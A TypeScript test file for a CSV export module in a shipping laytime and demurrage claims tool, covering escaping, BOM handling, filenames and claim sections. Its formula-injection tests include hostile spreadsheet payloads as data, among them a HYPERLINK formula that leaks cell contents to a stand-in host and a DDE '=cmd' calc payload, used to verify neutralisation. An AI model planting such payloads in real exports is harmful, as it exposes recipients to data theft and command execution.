// CSV export, with the spreadsheet-specific hazards asserted explicitly.
//
// The escaping rules are ordinary RFC 4180 and are tested as such. The part
// worth reading is `formula injection`: this export is opened in Excel by a
// counterparty's claims department, and half its content is text lifted
// verbatim out of a PDF that the counterparty supplied.

import { describe, expect, test } from "bun:test";
import {
  UTF8_BOM,
  breakdownToCsv,
  claimToCsv,
  csvField,
  csvFileBody,
  csvFilename,
  csvRow,
  eventsToCsv,
  neutralise,
  toCsv,
} from "./export-csv";

describe("csvField — RFC 4180", () => {
  test("passes plain text through unquoted", () => {
    expect(csvField("ALL_FAST")).toBe("ALL_FAST");
  });

  test("quotes a value containing a comma", () => {
    expect(csvField("Santos, Brazil")).toBe('"Santos, Brazil"');
  });

  test("doubles embedded quotes and wraps", () => {
    expect(csvField('vessel "ARTEMIS" alongside')).toBe('"vessel ""ARTEMIS"" alongside"');
  });

  test("quotes across newlines, so a multi-line SoF note stays one cell", () => {
    expect(csvField("rain stopped work\nresumed 07:40")).toBe('"rain stopped work\nresumed 07:40"');
    expect(csvField("a\r\nb")).toBe('"a\r\nb"');
  });

  test("emits numbers unquoted so a column can be summed", () => {
    expect(csvField(12.5)).toBe("12.5");
    expect(csvField(0)).toBe("0");
  });

  test("renders a missing value as empty, not as the word null", () => {
    expect(csvField(null)).toBe("");
    expect(csvField(undefined)).toBe("");
  });

  test("non-finite numbers become empty rather than the text NaN", () => {
    // "NaN" in a money column reads as a data-entry error; blank reads as
    // "not available", which is what it is.
    expect(csvField(NaN)).toBe("");
    expect(csvField(Infinity)).toBe("");
  });

  test("booleans render as spreadsheet booleans", () => {
    expect(csvField(true)).toBe("TRUE");
    expect(csvField(false)).toBe("FALSE");
  });
});

describe("formula injection", () => {
  // THE ATTACK. `raw_text` is a line a vision model lifted out of a
  // counterparty-supplied PDF. Excel executes a cell beginning =, +, - or @.
  test.each([
    ['=HYPERLINK("https://evil.test?d="&A1,"click")', "="],
    ["+1+1", "+"],
    ["-2+3", "-"],
    ["@SUM(A1:A9)", "@"],
    ["\t=cmd", "\t"],
    ["\r=cmd", "\r"],
  ])("neutralises a cell beginning %p", (payload) => {
    const out = neutralise(payload);
    expect(out.startsWith("'")).toBe(true);
    // The original content is preserved in full — this is evidence, and
    // stripping characters would corrupt it.
    expect(out.slice(1)).toBe(payload);
  });

  test("the neutralised value survives field encoding", () => {
    const field = csvField('=cmd|" /C calc"!A0');
    // Quoted (it contains a quote), prefixed, and the inner quotes doubled.
    expect(field).toBe(`"'=cmd|"" /C calc""!A0"`);
  });

  test("leaves ordinary evidence text untouched", () => {
    expect(neutralise("Vessel all fast alongside berth no. 3")).toBe(
      "Vessel all fast alongside berth no. 3"
    );
    expect(neutralise("")).toBe("");
  });

  test("a negative figure keeps its sign rather than being silently corrected", () => {
    // "-1200 MT shortfall" must export intact. It is prefixed, not stripped:
    // deleting the minus would change a figure somebody may rely on later.
    const out = neutralise("-1200 MT shortfall");
    expect(out).toBe("'-1200 MT shortfall");
    expect(out).toContain("-1200");
  });

  test("a real negative NUMBER is unaffected, because numbers do not go through neutralise", () => {
    // Only strings are formula vectors. A computed -1200 is still -1200, and a
    // despatch figure that exported as text would break every recipient's sum.
    expect(csvField(-1200)).toBe("-1200");
    expect(csvField(-0.5)).toBe("-0.5");
  });
});

describe("rows and documents", () => {
  test("joins a row with commas", () => {
    expect(csvRow(["a", 1, true])).toBe("a,1,TRUE");
  });

  test("toCsv emits CRLF and terminates the final line", () => {
    const csv = toCsv(["a", "b"], [[1, 2], [3, 4]]);
    expect(csv).toBe("a,b\r\n1,2\r\n3,4\r\n");
  });

  test("a header with no rows is still a valid document", () => {
    expect(toCsv(["a", "b"], [])).toBe("a,b\r\n");
  });

  test("the file body carries a BOM so Excel reads UTF-8", () => {
    // Without it, "Gdańsk" arrives mojibaked on Windows.
    const body = csvFileBody(toCsv(["port"], [["Gdańsk"]]));
    expect(body.startsWith(UTF8_BOM)).toBe(true);
    expect(body).toContain("Gdańsk");
  });

  test("the BOM belongs to the file, not to the format", () => {
    expect(toCsv(["a"], []).startsWith(UTF8_BOM)).toBe(false);
  });
});

describe("csvFilename", () => {
  test("strips characters that break a download", () => {
    // "M/V ARTEMIS" is an entirely ordinary vessel name and the slash would
    // truncate the filename.
    expect(csvFilename(["M/V ARTEMIS", "VOY-12"], "laytime")).toBe("M-V-ARTEMIS-VOY-12-laytime.csv");
  });

  test("collapses runs and trims separators", () => {
    expect(csvFilename(["  ODYSSEY  ", null, "", "A//B"], "sof")).toBe("ODYSSEY-A-B-sof.csv");
  });

  test("falls back rather than producing a nameless file", () => {
    expect(csvFilename([null, undefined, "   "], "laytime")).toBe("claim-laytime.csv");
    expect(csvFilename(["///"], "laytime")).toBe("claim-laytime.csv");
  });

  test("bounds the length", () => {
    expect(csvFilename(["x".repeat(300)], "laytime").length).toBeLessThanOrEqual(80 + ".csv".length + "-laytime".length);
  });
});

describe("eventsToCsv", () => {
  test("keeps timestamps as ISO text, never as a spreadsheet date", () => {
    // THE ONE THAT DECIDES DISPUTES. Excel reinterprets anything date-shaped in
    // the opening machine's locale: 04/03/2024 is April 3rd in the US and March
    // 4th in Europe, and laytime turns on exactly that.
    const csv = eventsToCsv([
      {
        occurredAt: "2024-03-04T06:30:00+08:00",
        eventType: "NOR_TENDERED",
        source: "vision",
        status: "accepted",
        rawText: "Notice of Readiness tendered",
      },
    ]);
    expect(csv).toContain("2024-03-04T06:30:00+08:00");
    expect(csv.split("\r\n")[0]).toBe(
      "occurred_at_utc,event_type,source,status,raw_text"
    );
  });

  test("survives a hostile raw_text", () => {
    const csv = eventsToCsv([
      {
        occurredAt: "2024-03-04T06:30:00Z",
        eventType: "NOR_TENDERED",
        rawText: '=cmd,"exfil"',
      },
    ]);
    expect(csv).toContain(`"'=cmd,""exfil"""`);
  });

  test("an empty timeline still produces a header", () => {
    expect(eventsToCsv([])).toBe("occurred_at_utc,event_type,source,status,raw_text\r\n");
  });
});

describe("breakdownToCsv", () => {
  const row = {
    start_time: "2024-03-04T06:30:00Z",
    end_time: "2024-03-04T11:45:00Z",
    duration_hours: 5.25,
    status: "laytime",
    counts: true,
    clause_ref: "GENCON94-6(c)",
    reasoning: "Laytime running, weather working day",
  };

  test("emits one row per interval with counts as a boolean", () => {
    const lines = breakdownToCsv([row]).trim().split("\r\n");
    expect(lines[0]).toBe(
      "start_time_utc,end_time_utc,duration_hours,status,counts_against_laytime,clause_ref,reasoning"
    );
    // The reasoning contains a comma, so it is quoted — the clause ref's
    // parentheses are not special and are left alone.
    expect(lines[1]).toBe(
      '2024-03-04T06:30:00Z,2024-03-04T11:45:00Z,5.25,laytime,TRUE,GENCON94-6(c),"Laytime running, weather working day"'
    );
  });

  test("duration stays numeric so the column sums", () => {
    expect(breakdownToCsv([row])).toContain(",5.25,");
  });
});

describe("claimToCsv", () => {
  const header = {
    vessel: "MV ODYSSEY",
    voyageRef: "VOY-2024-01",
    port: "Santos, Brazil",
    cargo: "Soybeans, 62,000 MT",
    cpForm: "GENCON94",
    engineVersion: 2,
    conformanceRoot: "261e3468d2246f30",
    generatedAt: "2026-08-09T10:00:00Z",
  };
  const totals = {
    allowed_hours: 96,
    used_hours: 110.5,
    time_on_demurrage_hours: 14.5,
    time_saved_hours: 0,
    demurrage_amount: 21750,
    despatch_amount: 0,
    currency: "USD",
  };

  test("carries the engine fingerprint with the numbers", () => {
    // A breakdown without it is a figure with no way to establish which rule
    // set produced it — the same reason it appears in the shared view.
    const csv = claimToCsv({ header, totals, breakdown: [], events: [] });
    expect(csv).toContain("261e3468d2246f30");
    expect(csv).toContain("Engine rule set,2");
  });

  test("quotes the header values that contain commas", () => {
    const csv = claimToCsv({ header, totals, breakdown: [], events: [] });
    expect(csv).toContain('"Santos, Brazil"');
    expect(csv).toContain('"Soybeans, 62,000 MT"');
  });

  test("says so plainly when there is no calculation", () => {
    // Not an empty totals block: a recipient must not read absence as zero
    // demurrage.
    const csv = claimToCsv({ header, totals: null, breakdown: [], events: [] });
    expect(csv).toContain("No calculation has been run for this claim");
    expect(csv).not.toContain("Demurrage amount,0");
  });

  test("includes the half-rate line only under ASBATANKVOY", () => {
    const withHalf = claimToCsv({
      header,
      totals: { ...totals, demurrage_half_rate_hours: 3 },
      breakdown: [],
      events: [],
    });
    expect(withHalf).toContain("Demurrage at half rate (hours),3");
    // GENCON 94 has no such concept, and an always-present "0" would imply the
    // rule was evaluated and found not to apply.
    expect(claimToCsv({ header, totals, breakdown: [], events: [] })).not.toContain(
      "half rate"
    );
  });

  test("is one document containing every section", () => {
    const csv = claimToCsv({
      header,
      totals,
      breakdown: [
        {
          start_time: "2024-03-04T06:30:00Z",
          end_time: "2024-03-04T11:45:00Z",
          duration_hours: 5.25,
          status: "laytime",
          counts: true,
          clause_ref: "GENCON94-6(c)",
          reasoning: "Laytime running",
        },
      ],
      events: [
        { occurredAt: "2024-03-04T06:30:00Z", eventType: "NOR_TENDERED", rawText: "NOR tendered" },
      ],
    });
    expect(csv).toContain("Laytime statement");
    expect(csv).toContain("Totals");
    expect(csv).toContain("start_time_utc");
    expect(csv).toContain("occurred_at_utc");
    expect(csv).toContain("MV ODYSSEY");
  });
});
